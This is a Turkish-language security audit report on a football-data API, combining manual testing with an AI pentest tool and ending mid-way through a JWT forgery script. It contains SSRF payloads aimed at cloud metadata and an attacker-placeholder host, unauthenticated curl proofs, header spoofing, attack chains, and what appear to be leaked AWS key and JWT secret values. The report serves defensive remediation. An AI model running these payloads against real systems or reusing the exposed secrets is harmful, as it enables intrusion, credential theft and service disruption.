# Golsinyali API - Kapsamlı Güvenlik Denetim Raporu

**Tarih:** 2026-02-25
**Hedef:** http://72.61.105.107:8000
**Araçlar:** Manuel pentest + Shannon AI Penetration Testing Framework
**Durum:** Shannon hala çalışıyor, bu rapor mevcut bulgulara dayanmaktadır

---

## İçindekiler

1. [Yönetici Özeti](#1-yönetici-özeti)
2. [KRITIK - Secret Sızıntısı](#2-kritik---secret-sızıntısı)
3. [KRITIK - Admin Endpoint'ler Korumasız](#3-kritik---admin-endpointler-korumasız)
4. [KRITIK - SSRF Açığı (force-primary)](#4-kritik---ssrf-açığı-force-primary)
5. [YÜKSEK - CORS Wildcard Açık](#5-yüksek---cors-wildcard-açık)
6. [YÜKSEK - Tüm Veri Endpoint'leri Auth'suz](#6-yüksek---tüm-veri-endpointleri-authsuz)
7. [YÜKSEK - Redis Şifresiz](#7-yüksek---redis-şifresiz)
8. [YÜKSEK - Rate Limiting Devre Dışı](#8-yüksek---rate-limiting-devre-dışı)
9. [YÜKSEK - HTTP Redirect Takip Açığı](#9-yüksek---http-redirect-takip-açığı)
10. [ORTA - IP Spoofing ile Rate Limit Bypass](#10-orta---ip-spoofing-ile-rate-limit-bypass)
11. [ORTA - Yetkilendirme (RBAC) Yok](#11-orta---yetkilendirme-rbac-yok)
12. [ORTA - Dependency Version Pinning Yok](#12-orta---dependency-version-pinning-yok)
13. [ORTA - Audit Log Yok](#13-orta---audit-log-yok)
14. [DÜŞÜK - Bilgi Sızıntısı](#14-düşük---bilgi-sızıntısı)
15. [DÜŞÜK - HSTS Preload Eksik](#15-düşük---hsts-preload-eksik)
16. [DÜŞÜK - Server Header Açık](#16-düşük---server-header-açık)
17. [TEMİZ - Sorun Bulunmayan Alanlar](#17-temiz---sorun-bulunmayan-alanlar)
18. [Saldırı Senaryoları](#18-saldırı-senaryoları)
19. [Düzeltme Öncelikleri](#19-düzeltme-öncelikleri)

---

## 1. Yönetici Özeti

Golsinyali Football API üzerinde yapılan kapsamlı güvenlik denetiminde **16 güvenlik açığı** tespit edilmiştir. Bunlardan **4'ü kritik**, **5'i yüksek**, **4'ü orta** ve **3'ü düşük** seviyededir.

### Risk Tablosu

| Seviye | Adet | Açıklama |
|--------|------|----------|
| **KRITIK** | 4 | Acil müdahale gerekli (24 saat içinde) |
| **YÜKSEK** | 5 | 1 hafta içinde düzeltilmeli |
| **ORTA** | 4 | 1 ay içinde düzeltilmeli |
| **DÜŞÜK** | 3 | Planlı bakımda düzeltilebilir |

### En Tehlikeli Bulgular

1. **Production secret'ları (AWS key, API key, JWT secret) git repo'sunda açık** - Tüm sistem ele geçirilebilir
2. **4 admin endpoint hiçbir auth istemeden çalışıyor** - Herkes cache temizleyebilir, veri kaynağını değiştirebilir
3. **SSRF açığı** - `/sources/force-primary` ile sunucu iç ağa istek göndertilebilir, AWS credential'ları çalınabilir
4. **CORS = `*`** - Herhangi bir web sitesi API'yi kullanabilir

---

## 2. KRITIK - Secret Sızıntısı

**CVSS:** 9.8 (Critical)
**CWE:** CWE-798 (Use of Hard-coded Credentials)
**Dosya:** `.env` (git repo'sunda)

### Sorun

Production ortamında kullanılan tüm gizli anahtarlar `.env` dosyasında düz metin olarak saklanıyor ve git repo'suna commit edilmiş durumda.

### Sızan Bilgiler

```
# .env satır 19-21 - API Anahtarları
SECRET_KEY=<production-key-exposed>
API_SECRET_KEY=<production-key-exposed>
JWT_SECRET_KEY=<production-key-exposed>

# .env satır 116-118 - AWS Credential'ları
AWS_ACCESS_KEY=AKIA2LIPZ73WPL6G53WG
AWS_SECRET_KEY=<production-key-exposed>
AWS_REGION=eu-north-1

# .env satır 120 - Sentry DSN
SENTRY_DSN=<production-dsn-exposed>
```

### Etki

| Sızan Bilgi | Saldırganın Yapabilecekleri |
|-------------|---------------------------|
| `API_SECRET_KEY` | Tüm API endpoint'lerine erişim, JWT token oluşturma |
| `JWT_SECRET_KEY` | Sahte JWT token'lar oluşturup herhangi bir kullanıcı gibi davranma |
| `SECRET_KEY` | Flask session imzalarını kırma |
| `AWS_ACCESS_KEY/SECRET` | AWS hesabına erişim, Lambda fonksiyonları çalıştırma, S3 bucket'lara erişim |
| `SENTRY_DSN` | Sahte hata raporları göndererek Sentry'yi kirletme |

### config.py'deki Default Secret'lar

```python
# config.py satır 12-19
SECRET_KEY = os.getenv('SECRET_KEY', 'dev-secret-key-change-in-production')
API_SECRET_KEY = os.getenv('API_SECRET_KEY', 'your-super-secret-api-key-change-in-production')
JWT_SECRET_KEY = os.getenv('JWT_SECRET_KEY', 'jwt-secret-key-change-in-production')
```

Eğer `.env` yüklenmezse bu zayıf default değerler kullanılır.

### Düzeltme

1. **Hemen:** Tüm key'leri yeniden oluştur (`python3 -c "import secrets; print(secrets.token_urlsafe(48))"`)
2. **Hemen:** AWS key'lerini AWS Console'dan devre dışı bırak ve yenisini oluştur
3. `.env` dosyasını `.gitignore`'a ekle
4. Git geçmişinden `.env`'yi temizle (`git filter-branch` veya `BFG Repo-Cleaner`)
5. Production'da environment variable olarak veya secret manager (AWS Secrets Manager, Vault) kullan

---

## 3. KRITIK - Admin Endpoint'ler Korumasız

**CVSS:** 9.1 (Critical)
**CWE:** CWE-862 (Missing Authorization)
**Dosya:** `routes/health.py`

### Sorun

4 admin endpoint hiçbir authentication/authorization gerektirmeden çalışıyor. İnternetteki herkes bu işlemleri yapabilir.

### Etkilenen Endpoint'ler ve Kanıtlar

#### 3.1 POST `/api/v1/cache/clear` - Cache Temizleme

```bash
# Test (auth olmadan)
$ curl -X POST http://72.61.105.107:8000/api/v1/cache/clear

# Yanıt: 200 OK
{
  "data": {"message": "Cache başarıyla temizlendi"},
  "success": true
}
```

**Etki:** Tüm Redis cache'i silinir. Sonraki tüm istekler upstream kaynaklardan taze veri çekmek zorunda kalır → response time 50ms'den 2000ms+'a çıkar. Tekrarlı çağrı ile DoS saldırısı yapılabilir.

#### 3.2 POST `/api/v1/sources/force-primary` - Veri Kaynağı Değiştirme

```bash
# Test (auth olmadan)
$ curl -X POST http://72.61.105.107:8000/api/v1/sources/force-primary \
  -H "Content-Type: application/json" \
  -d '{"source_url": "https://www.goaloo.com"}'

# Yanıt: 200 OK
{
  "data": {
    "message": "Primary source forced to https://www.goaloo.com",
    "new_primary": "https://www.goaloo.com"
  },
  "success": true
}
```

**Etki:** Saldırgan API'nin veri kaynağını değiştirebilir. Kendi sunucusunu source olarak verebilir → sahte maç verileri döndürür. Bu test sırasında production sunucusunun primary source'u gerçekten değişti!

#### 3.3 POST `/api/v1/sources/reset-metrics` - Sağlık Metriklerini Sıfırlama

```bash
# Test (auth olmadan)
$ curl -X POST http://72.61.105.107:8000/api/v1/sources/reset-metrics

# Yanıt: 200 OK
{
  "data": {"message": "Metrics reset for all sources"},
  "success": true
}
```

**Etki:** Veri kaynaklarının sağlık izleme metriklerini sıfırlar. Arızalı kaynak sağlıklı görünür → failover çalışmaz → kullanıcılar hata alır.

#### 3.4 POST `/api/v1/cache/stats/reset` - Cache İstatistiklerini Sıfırlama

```bash
# Test (auth olmadan)
$ curl -X POST http://72.61.105.107:8000/api/v1/cache/stats/reset

# Yanıt: 200 OK
{
  "data": {"message": "Cache istatistikleri sıfırlandı"},
  "success": true
}
```

**Etki:** Cache performans metriklerini sıfırlar → saldırı izlerini gizler, monitoring'i bozar.

### Kök Neden

`routes/health.py` dosyasında bu endpoint'ler tanımlı ama `@require_api_key` veya `@require_auth` decorator'ı uygulanmamış. `security.py`'de decorator'lar mevcut ama kullanılmıyor.

OpenAPI dökümantasyonunda bile bu kabul ediliyor:
> "Recommended auth: API Key or JWT (currently unenforced — planned fix)"

### Düzeltme

```python
# routes/health.py - her admin endpoint'e decorator ekle
from security import require_api_key

@health_bp.route('/cache/clear', methods=['POST'])
@require_api_key  # BU SATIRI EKLE
def clear_cache():
    ...

@health_bp.route('/sources/force-primary', methods=['POST'])
@require_api_key  # BU SATIRI EKLE
def force_primary():
    ...
```

---

## 4. KRITIK - SSRF Açığı (force-primary)

**CVSS:** 9.1 (Critical)
**CWE:** CWE-918 (Server-Side Request Forgery)
**Dosya:** `routes/health.py`, `http_client.py`
**Shannon Bulgu ID:** SSRF-VULN-01

### Sorun

`POST /api/v1/sources/force-primary` endpoint'i `source_url` parametresini hiçbir doğrulama yapmadan kabul ediyor. Bu URL daha sonra HTTP isteklerinde kullanılıyor. Saldırgan sunucuyu iç ağa istek göndermeye zorlayabilir.

### Teknik Detay

```
Saldırgan → POST /sources/force-primary {"source_url": "http://169.254.169.254/"}
                                              ↓
                                    URL doğrulaması: YOK
                                    Protokol kısıtlaması: YOK
                                    IP filtreleme: YOK
                                              ↓
                                    Sunucu → HTTP GET http://169.254.169.254/
                                              ↓
                                    AWS EC2 Metadata → IAM Credential'lar
```

### Eksik Savunmalar

| Savunma | Durum |
|---------|-------|
| URL şema doğrulama (https only) | YOK |
| Hostname allowlist | YOK |
| IP adresi filtreleme (10.x, 127.x, 169.254.x) | YOK |
| Redirect hedefi doğrulama | YOK |
| DNS rebinding koruması | YOK |

### Saldırı Hedefleri

```bash
# 1. AWS Metadata - IAM credential çalma
source_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 2. Redis - Şifresiz erişim
source_url = "http://127.0.0.1:6379/"

# 3. İç ağ taraması
source_url = "http://10.0.0.1/"
source_url = "http://192.168.1.1/"

# 4. Sahte veri sunucusu
source_url = "https://attacker-server.com/fake-football-data"
```

### Redirect ile Bypass

`http_client.py`'de 4 lokasyonda `allow_redirects=True` kullanılıyor (satır 137, 423, 733, 939). URL doğrulama eklense bile:

1. Saldırgan kendi HTTPS sunucusunu yazar (geçerli görünür)
2. Sunucu `302 Found` → `http://169.254.169.254/latest/meta-data/` redirect döner
3. API redirect'i takip eder → iç kaynaklara erişir

### Düzeltme

```python
from urllib.parse import urlparse

ALLOWED_SOURCES = [
    'live3.nowgoal26.com',
    'live4.nowgoal26.com',
    'www.nowgoal.com',
    'www.goaloo.com',
    'football.nowgoal26.com'
]

def validate_source_url(url):
    """Source URL'ini doğrula - sadece bilinen kaynakları kabul et"""
    parsed = urlparse(url)

    # Sadece HTTPS
    if parsed.scheme != 'https':
        raise ValueError("Sadece HTTPS URL'leri kabul edilir")

    # Sadece bilinen hostlar
    if parsed.hostname not in ALLOWED_SOURCES:
        raise ValueError(f"Bilinmeyen kaynak: {parsed.hostname}")

    # İç IP'leri engelle
    import ipaddress
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            raise ValueError("İç ağ adresleri kabul edilmez")
    except ValueError:
        pass  # hostname, IP değil - sorun yok

    return url
```

Ek olarak HTTP client'ta redirect doğrulaması:

```python
# http_client.py - redirect hedeflerini doğrula
session.get(url, allow_redirects=False)  # Manuel redirect takibi
# veya
session.max_redirects = 5  # Redirect sayısını sınırla
```

---

## 5. YÜKSEK - CORS Wildcard Açık

**CVSS:** 7.5 (High)
**CWE:** CWE-942 (Permissive Cross-domain Policy)
**Dosya:** `.env` satır 29, `app.py` satır 228-239

### Sorun

`.env` dosyasında `ALLOWED_ORIGINS=*` ayarı var. Bu, herhangi bir web sitesinin API'ye istek göndermesine izin verir.

### Kanıt

```bash
$ curl -s -I -H "Origin: https://evil-hacker.com" \
  http://72.61.105.107:8000/api/v1/health

Access-Control-Allow-Origin: https://evil-hacker.com
```

Sunucu `evil-hacker.com` origin'ine izin veriyor.

### Etki

- Saldırgan kendi web sitesinde JavaScript ile API'ye istek gönderebilir
- Kullanıcının tarayıcısı üzerinden API verilerine erişebilir
- API key header'da gönderiliyorsa bu bile sızdırılabilir

### app.py'deki Doğru Ayar (Override Ediliyor)

```python
# app.py satır 228-239 - Bu doğru ama .env tarafından eziliyor
allowed_origins = [
    'http://localhost:*',
    'http://127.0.0.1:*',
    'https://golsinyali.com',
    'https://www.golsinyali.com',
]
```

### Düzeltme

```bash
# .env'de wildcard'ı kaldır
ALLOWED_ORIGINS=https://golsinyali.com,https://www.golsinyali.com
```

---

## 6. YÜKSEK - Tüm Veri Endpoint'leri Auth'suz

**CVSS:** 7.5 (High)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

### Sorun

32 veri endpoint'i hiçbir authentication gerektirmeden çalışıyor. Herkes tüm maç, lig, canlı skor verilerine erişebilir.

### Kanıt

```bash
# Bugünün maçları - 253 maç auth olmadan
$ curl -s http://72.61.105.107:8000/api/v1/matches/today
→ Success: True, Match count: 253

# Canlı maçlar
$ curl -s http://72.61.105.107:8000/api/v1/matches/live
→ Success: True

# Lig puan tabloları
$ curl -s http://72.61.105.107:8000/api/v1/leagues/36/standings
→ Tüm veriler döner
```

### Korumasız Endpoint Listesi

| Kategori | Endpoint Sayısı | Örnekler |
|----------|----------------|----------|
| Maç verileri | 7 | `/match/{id}`, `/matches/today`, `/matches/date/{date}` |
| Canlı veriler | 6 | `/matches/live`, `/matches/live/{id}/stats`, `/matches/live/{id}/odds` |
| Lig verileri | 13 | `/leagues/{id}/standings`, `/leagues/{id}/full`, `/leagues/{id}/player-stats` |
| Analiz | 3 | `/match/{id}/h2h`, `/match/{id}/odds` |
| Sağlık | 3 | `/health`, `/health/detailed`, `/cache/stats` |

### Düzeltme

```python
# security.py'deki SecurityMiddleware zaten global auth kontrolü yapabiliyor
# Sadece API_SECRET_KEY ayarlandığında aktif oluyor
# Çözüm: Middleware'i zorunlu hale getir

class SecurityMiddleware:
    def before_request(self):
        # Health endpoint'leri hariç tut
        exempt_paths = ['/health', '/api/v1/health']
        if request.path in exempt_paths:
            return None

        # API key kontrolü
        api_key = request.headers.get('X-API-Key')
        if not api_key:
            return jsonify({'error': 'API key gerekli'}), 401
```

---

## 7. YÜKSEK - Redis Şifresiz

**CVSS:** 7.2 (High)
**CWE:** CWE-287 (Improper Authentication)
**Dosya:** `config.py` satır 27-31

### Sorun

Redis hiçbir parola olmadan çalışıyor. Sunucuya erişimi olan herkes cache verilerini okuyabilir, değiştirebilir veya silebilir.

### Konfigürasyon

```python
# config.py
CACHE_REDIS_HOST = os.getenv('CACHE_REDIS_HOST', 'localhost')
CACHE_REDIS_PORT = int(os.getenv('CACHE_REDIS_PORT', 6379))
CACHE_REDIS_DB = int(os.getenv('CACHE_REDIS_DB', 0))
# CACHE_REDIS_PASSWORD → TANIMLANMAMIŞ
```

### Etki

| Saldırı | Detay |
|---------|-------|
| **Cache Poisoning** | Sahte maç verileri, sahte oranlar enjekte edilebilir |
| **Veri Çalma** | Cache'teki tüm maç verileri okunabilir |
| **DoS** | `FLUSHALL` komutuyla tüm cache silinebilir |
| **Kod Çalıştırma** | Redis'in `EVAL` komutu ile Lua script çalıştırılabilir |

### Düzeltme

```bash
# redis.conf
requirepass <güçlü-parola>

# .env
CACHE_REDIS_PASSWORD=<güçlü-parola>
```

```python
# config.py
CACHE_REDIS_PASSWORD = os.getenv('CACHE_REDIS_PASSWORD', None)
```

---

## 8. YÜKSEK - Rate Limiting Devre Dışı

**CVSS:** 7.0 (High)
**CWE:** CWE-770 (Allocation of Resources Without Limits)
**Dosya:** `security.py` satır 276-278

### Sorun

Rate limiting altyapısı var ama kodda devre dışı bırakılmış (comment-out). Ayrıca token endpoint'inde rate limit yok → brute-force saldırısına açık.

### Kod

```python
# security.py satır 276-278 (DEVRE DIŞI)
# if not self.rate_limiter.is_allowed(client_ip, ...):
#     return jsonify({'error': 'Rate limit exceeded'}), 429
```

### Etki

- **API Key Brute-Force:** `/api/v1/auth/token` endpoint'ine sınırsız deneme yapılabilir
- **DoS:** Tek bir IP'den sınırsız istek gönderilebilir
- **Scraping:** Tüm veriler toplu olarak çekilebilir
- **Upstream Yük:** Cache miss durumunda upstream kaynaklara sınırsız istek gider

### Not

`app.py`'de `flask-limiter` ile 200/dakika limit tanımlı ama `security.py`'deki custom `AdvancedRateLimit` devre dışı. Global limiter çalışıyor olabilir ama token endpoint'i için özel limit yok.

### Düzeltme

```python
# Token endpoint'ine özel rate limit
@auth_bp.route('/token', methods=['POST'])
@limiter.limit("10 per minute")  # 10 deneme/dakika
def generate_token():
    ...
```

---

## 9. YÜKSEK - HTTP Redirect Takip Açığı

**CVSS:** 7.0 (High)
**CWE:** CWE-601 (URL Redirection to Untrusted Site)
**Dosya:** `http_client.py` satır 137, 423, 733, 939
**Shannon Bulgusu**

### Sorun

HTTP client tüm isteklerde `allow_redirects=True` kullanıyor ve redirect hedeflerini doğrulamıyor. 30 redirect'e kadar takip ediyor.

### Tehlike

URL doğrulaması eklense bile bu açık sayesinde bypass edilebilir:

```
Saldırgan sunucusu (HTTPS - geçerli görünür)
    → 302 Redirect → http://169.254.169.254/latest/meta-data/
    → 302 Redirect → http://127.0.0.1:6379/
    → 302 Redirect → http://10.0.0.1/admin
```

### Etkilenen Kod Lokasyonları

| Satır | Dosya | Kullanım |
|-------|-------|----------|
| 137 | http_client.py | Genel HTTP istek |
| 423 | http_client.py | Session-based GET |
| 733 | http_client.py | Warmup istekleri |
| 939 | http_client.py | Fallback istekleri |

### Düzeltme

```python
# http_client.py - redirect'leri kontrol et
response = session.get(url, allow_redirects=False)
if response.status_code in (301, 302, 303, 307, 308):
    redirect_url = response.headers.get('Location')
    if not is_safe_redirect(redirect_url):
        raise ValueError(f"Güvensiz redirect hedefi: {redirect_url}")
```

---

## 10. ORTA - IP Spoofing ile Rate Limit Bypass

**CVSS:** 5.3 (Medium)
**CWE:** CWE-290 (Authentication Bypass by Spoofing)
**Dosya:** `security.py` satır 159-169

### Sorun

`get_real_ip()` fonksiyonu proxy header'larına koşulsuz güveniyor. Saldırgan sahte header ile farklı bir IP gibi görünebilir.

### Kod

```python
# security.py satır 159-169
def get_real_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    elif request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    return request.remote_addr
```

### Kanıt

```bash
# Sahte IP ile istek
$ curl -H "X-Forwarded-For: 1.2.3.4" http://72.61.105.107:8000/api/v1/health
→ 200 OK (rate limit farklı IP'ye sayılır)
```

### Düzeltme

```python
# Sadece bilinen proxy'lerden gelen header'lara güven
TRUSTED_PROXIES = ['127.0.0.1', '10.0.0.1']  # Nginx/LB IP'leri

def get_real_ip():
    if request.remote_addr in TRUSTED_PROXIES:
        return request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
    return request.remote_addr
```

---

## 11. ORTA - Yetkilendirme (RBAC) Yok

**CVSS:** 5.4 (Medium)
**CWE:** CWE-285 (Improper Authorization)
**Dosya:** `security.py`

### Sorun

Sistem binary yetkilendirme kullanıyor: ya auth'lu ya auth'suz. "Admin" ve "normal kullanıcı" ayrımı yok. Geçerli API key'e sahip herkes admin işlemlerini yapabilir.

### Mevcut Durum

```
                    ┌─────────────┐
                    │  İstek Gelir │
                    └──────┬──────┘
                           │
                    ┌──────▼──────┐
                    │  API Key    │
                    │  Var mı?    │
                    └──────┬──────┘
                    Yok/   │  \Var
                    ┌──────▼──┐ ┌──▼──────┐
                    │ 401     │ │ TAM     │
                    │ Reddedil│ │ ERİŞİM  │ ← Admin dahil her şey
                    └─────────┘ └─────────┘
```

### Olması Gereken

```
                    ┌─────────────┐
                    │  İstek Gelir │
                    └──────┬──────┘
                           │
                    ┌──────▼──────┐
                    │  API Key    │
                    │  Var mı?    │
                    └──────┬──────┘
                    Yok/   │  \Var
                    ┌──────▼──┐ ┌──▼──────┐
                    │ 401     │ │ Rol     │
                    │ Reddedil│ │ Kontrol │
                    └─────────┘ └────┬────┘
                              User/  │  \Admin
                          ┌─────▼──┐ ┌──▼─────┐
                          │ Sadece │ │ TAM    │
                          │ Okuma  │ │ ERİŞİM │
                          └────────┘ └────────┘
```

### Düzeltme

JWT token'a `role` claim ekle, admin endpoint'lerde kontrol et.

---

## 12. ORTA - Dependency Version Pinning Yok

**CVSS:** 5.0 (Medium)
**CWE:** CWE-1357 (Reliance on Insufficiently Trustworthy Component)
**Dosya:** `requirements.txt`

### Sorun

`requirements.txt`'te kütüphane versiyonları sabitlenmemiş. `pip install` her çalıştığında farklı versiyon gelebilir → supply chain saldırısına açık.

### Düzeltme

```bash
pip freeze > requirements.txt
# veya
pip install pip-tools
pip-compile requirements.in
```

---

## 13. ORTA - Audit Log Yok

**CVSS:** 4.3 (Medium)
**CWE:** CWE-778 (Insufficient Logging)

### Sorun

Şu işlemler loglanmıyor:
- Başarılı API key kullanımı
- Admin işlemleri (cache temizleme, source değiştirme)
- Başarısız auth denemeleri (brute-force tespiti için)
- Rate limit aşımları

### Etki

- Saldırı tespiti yapılamaz
- Forensic analiz mümkün değil
- Compliance gereksinimleri karşılanmaz

### Düzeltme

```python
import logging
audit_logger = logging.getLogger('audit')

def log_admin_action(action, endpoint, details=None):
    audit_logger.warning(json.dumps({
        'timestamp': datetime.utcnow().isoformat(),
        'action': action,
        'endpoint': endpoint,
        'ip': get_real_ip(),
        'api_key': request.headers.get('X-API-Key', 'none')[:8] + '...',
        'details': details
    }))
```

---

## 14. DÜŞÜK - Bilgi Sızıntısı

**CVSS:** 3.7 (Low)
**CWE:** CWE-200 (Exposure of Sensitive Information)

### Sorun

`/api/v1/health/detailed` endpoint'i sistem bilgilerini ifşa ediyor:

```json
{
  "background_tasks": {
    "initialized": true,
    "is_leader": false,
    "worker_id": "worker-1026080"
  },
  "cache": "enabled",
  "cache_info": {
    "timeout": 300,
    "type": "unknown"
  },
  "version": "1.0.0"
}
```

### Etki

Worker ID, cache konfigürasyonu, versiyon bilgisi saldırgana keşif için yardımcı olur.

### Düzeltme

Detaylı health endpoint'i auth arkasına al veya hassas bilgileri kaldır.

---

## 15. DÜŞÜK - HSTS Preload Eksik

**CVSS:** 3.0 (Low)
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)

### Sorun

HSTS header'ı var ama `preload` directive'i eksik:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

`preload` olmadan tarayıcıların HSTS preload listesine eklenemez. Ayrıca sunucu HTTP üzerinde çalıştığı için HSTS header'ı anlamsız.

### Düzeltme

Önce HTTPS'i etkinleştir, sonra:
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

---

## 16. DÜŞÜK - Server Header Açık

**CVSS:** 2.6 (Low)
**CWE:** CWE-200

### Sorun

```
Server: gunicorn
```

Sunucu teknolojisini ifşa eder. Saldırgan gunicorn'a özel açıkları hedefleyebilir.

### Düzeltme

```python
# gunicorn_config.py
import gunicorn
gunicorn.SERVER = ''
```

---

## 17. TEMİZ - Sorun Bulunmayan Alanlar

Shannon ve manuel testlerde şu alanlarda açık **bulunmadı**:

| Alan | Durum | Açıklama |
|------|-------|----------|
| **XSS** | Temiz | JSON API, HTML render yok. XSS vektörü sıfır |
| **SQL Injection** | Temiz | Veritabanı kullanılmıyor |
| **Command Injection** | Temiz | `subprocess`, `os.system` network-accessible kodda yok |
| **SSTI** | Temiz | Template rendering kullanıcı girdisiyle yapılmıyor |
| **Path Traversal** | Temiz | Flask `<int:match_id>` type hint koruması çalışıyor |
| **Deserialization** | Temiz | Güvensiz deserialization fonksiyonu yok |
| **CSRF** | N/A | Stateless API, session cookie yok |
| **API Key Karşılaştırma** | Temiz | `hmac.compare_digest()` timing-safe kullanılıyor |
| **Security Headers** | İyi | `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `X-XSS-Protection: 1` mevcut |
| **Input Validation** | İyi | Match ID, League ID, Date format doğru validate ediliyor |

---

## 18. Saldırı Senaryoları

### Senaryo 1: Tam Sistem Ele Geçirme (Zincirleme Saldırı)

```
1. .env'den AWS_ACCESS_KEY çal
   ↓
2. AWS hesabına giriş yap
   ↓
3. Lambda fonksiyonlarını listele / S3 bucket'lara eriş
   ↓
4. Sunucu üzerinde keyfi kod çalıştır
```

**Zorluk:** Düşük (key'ler git repo'sunda açık)
**Etki:** Tam sistem kompromize

### Senaryo 2: Veri Manipülasyonu (Auth Gerekmez)

```
1. POST /sources/force-primary → Sahte sunucu URL'i ver
   ↓
2. API artık sahte sunucudan veri çeker
   ↓
3. Kullanıcılar yanlış maç skorları, sahte oranlar görür
   ↓
4. POST /sources/reset-metrics → İzleri temizle
   ↓
5. POST /cache/stats/reset → Monitoring'i sıfırla
```

**Zorluk:** Çok düşük (curl ile yapılabilir, auth gerekmez)
**Etki:** Tüm kullanıcılar sahte veri alır

### Senaryo 3: DoS Saldırısı (Auth Gerekmez)

```
1. Her 10 saniyede POST /cache/clear çağır
   ↓
2. Tüm cache sürekli siliniyor
   ↓
3. Her istek upstream'e gidiyor (2000ms+ response time)
   ↓
4. NowGoal/Goaloo anti-bot tetikleniyor → sunucu bloklanır
   ↓
5. AWS Lambda maliyetleri patlar
```

**Zorluk:** Çok düşük (tek satır bash script)
**Etki:** Servis kullanılamaz hale gelir

### Senaryo 4: SSRF ile AWS Credential Çalma

```
1. POST /sources/force-primary
   {"source_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
   ↓
2. Sunucu AWS metadata endpoint'ine istek gönderir
   ↓
3. IAM role credential'ları döner
   ↓
4. Saldırgan AWS hesabına erişir
```

**Zorluk:** Orta (SSRF'in response'u doğrudan dönmeyebilir)
**Etki:** AWS hesabı kompromize

---

## 19. Düzeltme Öncelikleri

### Acil (24 saat içinde)

| # | İşlem | Dosya |
|---|-------|-------|
| 1 | Tüm secret'ları yeniden oluştur | `.env`, AWS Console |
| 2 | AWS key'lerini devre dışı bırak | AWS IAM Console |
| 3 | Admin endpoint'lere `@require_api_key` ekle | `routes/health.py` |
| 4 | `.env`'yi `.gitignore`'a ekle | `.gitignore` |
| 5 | CORS'u `*` yerine domain listesine çevir | `.env` |

### 1 Hafta İçinde

| # | İşlem | Dosya |
|---|-------|-------|
| 6 | `source_url` parametresine URL doğrulama ekle | `routes/health.py` |
| 7 | HTTP redirect hedeflerini doğrula | `http_client.py` |
| 8 | Redis'e parola ekle | `redis.conf`, `config.py` |
| 9 | Rate limiting'i aktif et | `security.py` |
| 10 | Token endpoint'e rate limit ekle | `routes/auth.py` |

### 1 Ay İçinde

| # | İşlem | Dosya |
|---|-------|-------|
| 11 | RBAC (rol tabanlı yetkilendirme) implementasyonu | `security.py` |
| 12 | Audit logging ekle | Yeni `audit.py` |
| 13 | IP spoofing koruması (trusted proxy) | `security.py` |
| 14 | Dependency version pinning | `requirements.txt` |
| 15 | HTTPS etkinleştir (Let's Encrypt) | Sunucu konfigürasyonu |
| 16 | Server header'ı gizle | `gunicorn_config.py` |

---

## 20. YÜKSEK - HTTP Plaintext (HTTPS Yok)

**CVSS:** 7.4 (High)
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)
**Shannon Bulgu ID:** AUTH-VULN-03
**Dosya:** `gunicorn_config.py` satır 11, satır 164-175

### Sorun

API tamamen HTTP üzerinde çalışıyor (port 8000). TLS/SSL yok. Tüm trafik - API key'ler, JWT token'lar, maç verileri - düz metin olarak iletiliyor.

### Shannon'ın Canlı Test Kanıtı

Shannon raw socket ile bağlanıp plaintext iletişimi doğruladı:

```
TCP Stream: client → 72.61.105.107:8000

POST /api/v1/auth/token HTTP/1.1          ← Şifrelenmemiş
Host: 72.61.105.107:8000
Content-Type: application/json

{"api_key": "HdWTQr..."}                  ← API key düz metin!

HTTP/1.1 200 OK
{"access_token": "eyJhbGci..."}           ← JWT token düz metin!
```

HTTPS denemesi başarısız oldu (SSL/TLS yapılandırılmamış):
```
$ curl https://72.61.105.107:8000/api/v1/health → SSL Error
$ curl http://72.61.105.107:8000/api/v1/health  → 200 OK
```

### Etki

| Saldırı | Araç | Zorluk |
|---------|------|--------|
| Aynı WiFi'den credential yakalama | Wireshark, tcpdump | Çok düşük |
| ISP seviyesinde trafik izleme | - | Düşük |
| Man-in-the-Middle | mitmproxy, Burp Suite | Orta |
| DNS spoofing + trafik yönlendirme | ettercap | Orta |

### Ayrıca

`gunicorn_config.py` satır 164-175'te SSL konfigürasyonu var ama **comment-out** edilmiş:

```python
# SSL configuration (commented out)
# keyfile = '/path/to/keyfile'
# certfile = '/path/to/certfile'
```

HSTS header'ı ayarlanmış ama HTTP üzerinde etkisiz (RFC 6797 gereği tarayıcılar HTTP'deki HSTS header'ını yoksayar).

### Düzeltme

```bash
# Let's Encrypt ile ücretsiz SSL sertifikası
sudo apt install certbot
sudo certbot certonly --standalone -d api.golsinyali.com

# gunicorn_config.py - SSL aktif et
keyfile = '/etc/letsencrypt/live/api.golsinyali.com/privkey.pem'
certfile = '/etc/letsencrypt/live/api.golsinyali.com/fullchain.pem'
```

Veya Nginx reverse proxy ile:
```nginx
server {
    listen 443 ssl;
    ssl_certificate /etc/letsencrypt/live/api.golsinyali.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/api.golsinyali.com/privkey.pem;

    location / {
        proxy_pass http://127.0.0.1:8000;
    }
}

server {
    listen 80;
    return 301 https://$host$request_uri;  # HTTP → HTTPS yönlendirme
}
```

---

## 21. YÜKSEK - JWT Token Sahteciliği (Forgery)

**CVSS:** 7.2 (High)
**CWE:** CWE-347 (Improper Verification of Cryptographic Signature)
**Shannon Bulgu ID:** AUTH-VULN-02
**Dosya:** `security.py` satır 220-234

### Sorun

JWT secret key `.env` dosyasında açık. HS256 simetrik imzalama kullanıldığından, secret'a sahip olan herkes geçerli JWT token oluşturabilir - istediği `user_id`, istediği `exp` süresiyle.

### Saldırı

```python
import jwt, time

# Sızmış secret key
JWT_SECRET = 'dxNExViS39I5FsoWnHQ-5Gvp4Lf-UixkcpwJ1o0-nOPwbvsn2jyV2JgVaaBbjn3V'

# 1 yıl geçerli sahte token oluştur
fake_token = jwt.encode(
    {
        'user_id': 'attacker',
